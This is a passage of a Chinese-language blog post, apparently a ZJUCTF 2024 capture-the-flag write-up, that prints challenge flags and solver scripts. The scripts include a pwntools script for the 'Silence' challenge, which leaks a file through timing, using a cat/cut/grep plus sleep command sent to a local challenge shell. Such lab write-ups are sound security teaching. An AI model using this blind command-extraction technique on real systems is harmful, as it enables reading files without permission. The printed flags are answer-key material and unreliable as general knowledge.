@@ -1,0 +1,503 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 6.3.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.2.1/css/all.min.css" integrity="sha256-Z1K5uhUaJXA7Ll0XrZ/0JhX4lAtZFpT6jkKrEDT0drU=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.5.7/jquery.fancybox.min.css" integrity="sha256-Vzbj7sDDS/woiFS3uNKo8eIuni59rjyNGtXfstRzStA=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/themes/blue/pace-theme-flash.css">
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/pace.min.js" integrity="sha256-gqd7YTjg/BtfqWSwsJOvndl0Bxc8gFImLEkXQT8+qj0=" crossorigin="anonymous"></script>
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"blog.5dbwat4.top","root":"/","images":"/images","scheme":"Muse","darkmode":false,"version":"8.14.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":{"enable":false,"style":null},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":true,"pangu":true,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}}</script><script src="/js/config.js"></script>
+
+    <meta name="description" content="参加了ZJUCTF 2024，这是Writeup.">
+<meta property="og:type" content="article">
+<meta property="og:title" content="ZJUCTF 2024 Writeup">
+<meta property="og:url" content="https://blog.5dbwat4.top/arch/ZJUCTF-2024-Writeup.html">
+<meta property="og:site_name" content="5dbwat4&#39;s Blog">
+<meta property="og:description" content="参加了ZJUCTF 2024，这是Writeup.">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://blog.5dbwat4.top/arch/ZJUCTF-2024-Writeup/p1.png">
+<meta property="og:image" content="https://blog.5dbwat4.top/arch/ZJUCTF-2024-Writeup/p2.png">
+<meta property="og:image" content="https://blog.5dbwat4.top/arch/ZJUCTF-2024-Writeup/p3.png">
+<meta property="og:image" content="https://blog.5dbwat4.top/arch/ZJUCTF-2024-Writeup/p4.png">
+<meta property="og:image" content="https://blog.5dbwat4.top/arch/ZJUCTF-2024-Writeup/p5.png">
+<meta property="og:image" content="https://blog.5dbwat4.top/arch/ZJUCTF-2024-Writeup/p6.png">
+<meta property="og:image" content="https://blog.5dbwat4.top/arch/ZJUCTF-2024-Writeup/p7.png">
+<meta property="og:image" content="https://blog.5dbwat4.top/arch/ZJUCTF-2024-Writeup/p8.png">
+<meta property="og:image" content="https://blog.5dbwat4.top/arch/ZJUCTF-2024-Writeup/p9.png">
+<meta property="og:image" content="https://blog.5dbwat4.top/arch/ZJUCTF-2024-Writeup/p10.png">
+<meta property="og:image" content="https://blog.5dbwat4.top/arch/ZJUCTF-2024-Writeup/p11.png">
+<meta property="og:image" content="https://blog.5dbwat4.top/arch/ZJUCTF-2024-Writeup/p12.png">
+<meta property="og:image" content="https://blog.5dbwat4.top/arch/ZJUCTF-2024-Writeup/p13.png">
+<meta property="og:image" content="https://blog.5dbwat4.top/arch/ZJUCTF-2024-Writeup/p15.png">
+<meta property="og:image" content="https://blog.5dbwat4.top/arch/ZJUCTF-2024-Writeup/p14.png">
+<meta property="og:image" content="https://blog.5dbwat4.top/arch/ZJUCTF-2024-Writeup/p16.png">
+<meta property="article:published_time" content="2024-10-22T04:25:46.000Z">
+<meta property="article:modified_time" content="2024-11-01T07:49:37.785Z">
+<meta property="article:author" content="5dbwat4">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://blog.5dbwat4.top/arch/ZJUCTF-2024-Writeup/p1.png">
+
+
+<link rel="canonical" href="https://blog.5dbwat4.top/arch/ZJUCTF-2024-Writeup.html">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://blog.5dbwat4.top/arch/ZJUCTF-2024-Writeup.html","path":"arch/ZJUCTF-2024-Writeup.html","title":"ZJUCTF 2024 Writeup"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>ZJUCTF 2024 Writeup | 5dbwat4's Blog</title>
+  
+
+
+
+
+
+
+  <script async defer data-website-id="" src=""></script>
+
+  <script defer data-domain="" src=""></script>
+
+       <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+  <link rel="stylesheet" href="/assets/live2d/w.css"/>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">5dbwat4's Blog</p>
+      <i class="logo-line"></i>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="搜索" role="button">
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li>
+  </ul>
+</nav>
+
+
+
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%AD%BE%E5%88%B0%E9%A2%98"><span class="nav-number">1.</span> <span class="nav-text">签到题</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%AE%B9%E5%99%A8%E9%A2%98%E8%AF%B4%E6%98%8E"><span class="nav-number">2.</span> <span class="nav-text">容器题说明</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%AD%BE%E9%80%80%E9%97%AE%E5%8D%B7"><span class="nav-number">3.</span> <span class="nav-text">签退问卷</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Master-of-C"><span class="nav-number">4.</span> <span class="nav-text">Master of C++</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Bytes"><span class="nav-number">5.</span> <span class="nav-text">Bytes?</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%B0%8F-A-%E5%8F%A3%E7%AE%97"><span class="nav-number">6.</span> <span class="nav-text">小 A 口算</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#CBA"><span class="nav-number">7.</span> <span class="nav-text">CBA</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Silence"><span class="nav-number">8.</span> <span class="nav-text">Silence</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#ezxor"><span class="nav-number">9.</span> <span class="nav-text">ezxor</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Shad0wTime"><span class="nav-number">10.</span> <span class="nav-text">Shad0wTime</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#easy-Pentest"><span class="nav-number">11.</span> <span class="nav-text">easy Pentest</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%B1%B1%E9%9B%80"><span class="nav-number">12.</span> <span class="nav-text">山雀</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#rev-beginner-1"><span class="nav-number">13.</span> <span class="nav-text">rev beginner 1</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#rev-beginner-2"><span class="nav-number">14.</span> <span class="nav-text">rev beginner 2</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Minec-re-tf-Unity-Edition"><span class="nav-number">15.</span> <span class="nav-text">Minec(re)tf Unity Edition</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#easy-hap"><span class="nav-number">16.</span> <span class="nav-text">easy hap</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Minec-re-tf"><span class="nav-number">17.</span> <span class="nav-text">Minec(re)tf</span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">5dbwat4</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">25</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">3</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author animated">
+      <span class="links-of-author-item">
+        <a href="https://github.com/5dbwat4" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;5dbwat4" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:me@5dbwat4.top" title="E-Mail → mailto:me@5dbwat4.top" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+
+        </div>
+      </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://blog.5dbwat4.top/arch/ZJUCTF-2024-Writeup.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="5dbwat4">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="5dbwat4's Blog">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="ZJUCTF 2024 Writeup | 5dbwat4's Blog">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          ZJUCTF 2024 Writeup
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2024-10-22 12:25:46" itemprop="dateCreated datePublished" datetime="2024-10-22T12:25:46+08:00">2024-10-22</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2024-11-01 15:49:37" itemprop="dateModified" datetime="2024-11-01T15:49:37+08:00">2024-11-01</time>
+    </span>
+
+  
+    <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv">
+      <span class="post-meta-item-icon">
+        <i class="far fa-eye"></i>
+      </span>
+      <span class="post-meta-item-text">阅读次数：</span>
+      <span id="busuanzi_value_page_pv"></span>
+    </span>
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+        <p>参加了ZJUCTF 2024，这是Writeup.</p>
+<span id="more"></span>
+
+
+<!-- **推荐用binwalk从这个pdf的末尾取出含有相关exp的zip文件。**
+
+这些内容通常是二进制，或者太长而不便在正文中展示。
+
+
+
+--- -->
+
+<p><span style="font-size:60px;color:red">原来你们都是凭实力拿分，只有我背着一堆轮子。😭</span></p>
+<p>但是题目出的真好，做的豪爽</p>
+<hr>
+<h1 id="签到题"><a href="#签到题" class="headerlink" title="签到题"></a>签到题</h1><p>QQ群拿到前半<code>ZJUCTF&#123;WElc0m3_7o_ZJUCTF2024_4ND_</code></p>
+<p>公众号拿到后半部分</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">签到题 flag 第二部分：H0P3_Y0U_ENjoy_the_6aM3&#125;</span><br><span class="line">加油💪冲冲冲🚀</span><br></pre></td></tr></table></figure>
+
+<h1 id="容器题说明"><a href="#容器题说明" class="headerlink" title="容器题说明"></a>容器题说明</h1><p>字面意思连上容器得到flag</p>
+<p>wsrx连不上了所以不放flag了（雾</p>
+<h1 id="签退问卷"><a href="#签退问卷" class="headerlink" title="签退问卷"></a>签退问卷</h1><p>同理问卷不想再做一遍所以不放flag了</p>
+<h1 id="Master-of-C"><a href="#Master-of-C" class="headerlink" title="Master of C++"></a>Master of C++</h1><p><img data-src="/arch/ZJUCTF-2024-Writeup/p1.png"></p>
+<p>可以打表打到两万吗？当然可以！</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">// Works for 1&lt;=ARG&lt;=27889</span></span><br><span class="line"><span class="comment">//                  (167**2, maybe more)</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">main</span>()&#123;</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _(a) !(ARG!=a&amp;&amp;ARG%a==0)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> o(a,b,c) (a&amp;&amp;_(b)&amp;&amp;_(c))</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> s ARG!=1&amp;&amp;o(o(o(o(o(o(o(o(o(o(o(o(o(o(o(o(o(o(o(_(2),3,5),7,11),13,17),19,23),29,31),37,41),43,47),53,59),61,67),71,73),79,83),89,97),101,103),107,109),113,127),131,137),139,149),151,157),163,167)?0:1</span></span><br><span class="line"><span class="keyword">return</span> s;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//我操尼玛1也是测试数据之一真nm服了</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img data-src="/arch/ZJUCTF-2024-Writeup/p2.png"></p>
+<p>其实就是把这个压行再压行，<del>终于活成了箱子最讨厌的样子（x</del></p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> arg=ARG;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">2</span>; i*i&lt;=arg;i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(arg%i==<span class="number">0</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>flag为<code>ZJUCTF&#123;pR3m4tuR3_0PT1miz4t1oN_1s_thE_R00t_of_4LL_3v1l&#125;</code></p>
+<h1 id="Bytes"><a href="#Bytes" class="headerlink" title="Bytes?"></a>Bytes?</h1><p>奇怪的bytes？转成二进制！好像有点异常，其实不知道当初怎么想到字符画的，但总之是想到了。</p>
+<p>总长度6072，分解质因数挨个试一下，276x22时拿到了</p>
+<p>可以看pdf附带的zip文件，<code>/zjuc--chess/cpline_276.txt</code></p>
+<p>flag为<code>ZJUCTF&#123;COU_GOU_LIANG_HANG_BA&#125;</code></p>
+<h1 id="小-A-口算"><a href="#小-A-口算" class="headerlink" title="小 A 口算"></a>小 A 口算</h1><p>做出来的人好多…</p>
+<p>会pwntools有手就行</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> * </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sh = remote(<span class="string">&quot;127.0.0.1&quot;</span>,<span class="number">10304</span>)</span><br><span class="line"></span><br><span class="line">sh.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">&quot; as much as possible!&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;1&quot;</span>,sh.recvline().decode())</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;1&quot;</span>,sh.recvline().decode())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># string is like &#x27;15 ? 4&#x27;,get the two number</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">str</span> = sh.recvline().decode()</span><br><span class="line">num1 = <span class="built_in">int</span>(<span class="built_in">str</span>.split(<span class="string">&quot;?&quot;</span>)[<span class="number">0</span>])</span><br><span class="line">num2 = <span class="built_in">int</span>(<span class="built_in">str</span>.split(<span class="string">&quot;?&quot;</span>)[<span class="number">1</span>])</span><br><span class="line"><span class="built_in">print</span>(num1,num2)</span><br><span class="line"></span><br><span class="line">sh.sendline(<span class="string">&quot;&gt;&quot;</span> <span class="keyword">if</span> num1&gt;num2 <span class="keyword">else</span> <span class="string">&quot;&lt;&quot;</span> <span class="keyword">if</span> num1&lt;num2 <span class="keyword">else</span> <span class="string">&quot;=&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(sh.recvline().decode())</span><br><span class="line">sh.recvline().decode()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2000</span>):</span><br><span class="line">    <span class="built_in">str</span> = sh.recvline().decode()</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">str</span> == <span class="string">&quot;Time&#x27;s up!\n&quot;</span>):</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    num1 = <span class="built_in">int</span>(<span class="built_in">str</span>.split(<span class="string">&quot;?&quot;</span>)[<span class="number">0</span>])</span><br><span class="line">    num2 = <span class="built_in">int</span>(<span class="built_in">str</span>.split(<span class="string">&quot;?&quot;</span>)[<span class="number">1</span>])</span><br><span class="line">    <span class="built_in">print</span>(num1,num2,end=<span class="string">&quot; &quot;</span>)</span><br><span class="line"></span><br><span class="line">    sh.sendline(<span class="string">&quot;&gt;&quot;</span> <span class="keyword">if</span> num1&gt;num2 <span class="keyword">else</span> <span class="string">&quot;&lt;&quot;</span> <span class="keyword">if</span> num1&lt;num2 <span class="keyword">else</span> <span class="string">&quot;=&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(sh.recvline().decode())</span><br><span class="line">    sh.recvline().decode()</span><br><span class="line"></span><br><span class="line"><span class="comment"># </span></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
+
+<h1 id="CBA"><a href="#CBA" class="headerlink" title="CBA"></a>CBA</h1><p>先reverse CBA to ABC</p>
+<p><img data-src="/arch/ZJUCTF-2024-Writeup/p3.png" alt="拖`Abc-decompiler`逆向"></p>
+<p><img data-src="/arch/ZJUCTF-2024-Writeup/p4.png" alt="反正就是啥都要倒过来"></p>
+<p><img data-src="/arch/ZJUCTF-2024-Writeup/p5.png" alt="整出来的东西"></p>
+<p>直接弄出来dump到html中</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> fs = <span class="built_in">require</span>(<span class="string">&#x27;fs&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> content = fs.<span class="title function_">readFileSync</span>(<span class="string">&#x27;stupid-fuck-colors.txt&#x27;</span>, <span class="string">&#x27;utf8&#x27;</span>).<span class="title function_">split</span>(<span class="string">&#x27;\n&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> sps=<span class="string">&quot;&lt;div&gt;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; content.<span class="property">length</span>; i++) &#123;</span><br><span class="line">    <span class="keyword">if</span>(i % <span class="number">100</span> == <span class="number">0</span>)&#123;</span><br><span class="line">        sps+=<span class="string">&quot;&lt;/div&gt;&lt;div style=&#x27;display:block;width:fit-content;height:10px&#x27;&gt;&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">    sps+=<span class="string">&quot;&lt;span style=&#x27;display:inline-block;width:10px;height:10px;background-color:&quot;</span>+content[i]+<span class="string">&quot;;&#x27;&gt;&lt;/span&gt;&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">sps+=<span class="string">&quot;&lt;/div&gt;&quot;</span></span><br><span class="line"></span><br><span class="line">fs.<span class="title function_">writeFileSync</span>(<span class="string">&#x27;stupid-fuck-colors.html&#x27;</span>, sps, <span class="string">&#x27;utf8&#x27;</span>);</span><br></pre></td></tr></table></figure>
+
+<p><img data-src="/arch/ZJUCTF-2024-Writeup/p6.png"></p>
+<h1 id="Silence"><a href="#Silence" class="headerlink" title="Silence"></a>Silence</h1><p>sleep-based test</p>
+<p>sleep盲注（sql注入那里学来的技巧）</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">lab = <span class="string">&quot;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ/+=-_\&#123;\&#125;[]()\&quot;?!.,:;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># check_cmd = &quot; ls |  sed -n \&quot;4p\&quot;&quot;</span></span><br><span class="line">check_cmd = <span class="string">&quot;cat easy* &quot;</span></span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&quot;127.0.0.1&quot;</span>, <span class="number">14918</span>)</span><br><span class="line">r.recvuntil(<span class="string">&quot;$ &quot;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">thread_i</span>(<span class="params">testingPos, testingChar</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Testing &quot;</span> + testingChar + <span class="string">&quot; at position &quot;</span> + <span class="built_in">str</span>(testingPos) + <span class="string">&quot; ...&quot;</span>)</span><br><span class="line">    r.sendline(check_cmd+<span class="string">&quot;&quot;&quot; | cut -c &quot;&quot;&quot;</span>+<span class="built_in">str</span>(testingPos)+<span class="string">&quot; | grep -q \&quot;&quot;</span>+ testingChar +<span class="string">&quot;\&quot;  &amp;&amp; sleep 10s || echo 0&quot;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">&quot;$ &quot;</span>)</span><br><span class="line">    <span class="comment"># print(testingChar + &quot; at position &quot; + str(testingPos) + &quot; racing fast. &quot;)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">testing_a</span>(<span class="params">testingPos</span>):</span><br><span class="line">    <span class="comment"># for char in lab:</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># for char in lab:</span></span><br><span class="line">    <span class="comment">#     t = threading.Thread(target=thread_i, args=(testingPos, char))</span></span><br><span class="line">    <span class="comment">#     t.start()</span></span><br><span class="line">    <span class="comment">#     t.join()</span></span><br><span class="line">    <span class="comment"># thread_i(testingPos, &quot;a&quot;)</span></span><br><span class="line">    <span class="keyword">for</span> char <span class="keyword">in</span> lab:</span><br><span class="line">        thread_i(testingPos, char)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="comment"># for i in range(1, 10):</span></span><br><span class="line">        <span class="comment"># testing_a(i)</span></span><br><span class="line">    testing_a(<span class="number">28</span>)</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">2: boo</span></span><br><span class="line"><span class="string">3: d</span></span><br><span class="line"><span class="string">4: easy_peasy?</span></span><br><span class="line"><span class="string">5: et</span></span><br><span class="line"><span class="string">6: h</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">                           ?28 ?</span></span><br><span class="line"><span class="string">ZJUCTF&#123;I_Jus7-w4nt_2_slEE3p!zZZ&#125;</span></span><br><span class="line"><span class="string">0000000001111111111222222222233333333334</span></span><br><span class="line"><span class="string">1234567890123456789012345678901234567890</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>解释一下这个程序发生了什么：</p>
+<p>首先猜flag文件的名字</p>
+<p>发现有一个easy_peasy…..（后面没测）的文件可疑</p>
+<p>然后就读，猜中那个字符会sleep卡住。</p>
+<p>（一开始想多线程，让猜对的字母最先输出，以失败告终）</p>
+<p><del>总之就是我想睡觉（乐</del></p>
+<h1 id="ezxor"><a href="#ezxor" class="headerlink" title="ezxor"></a>ezxor</h1><p>可以看zip文件中的<code>/zjuc--ezxor/wp.txt</code></p>
+<p>这玩意一旦分行了就没内味了</p>
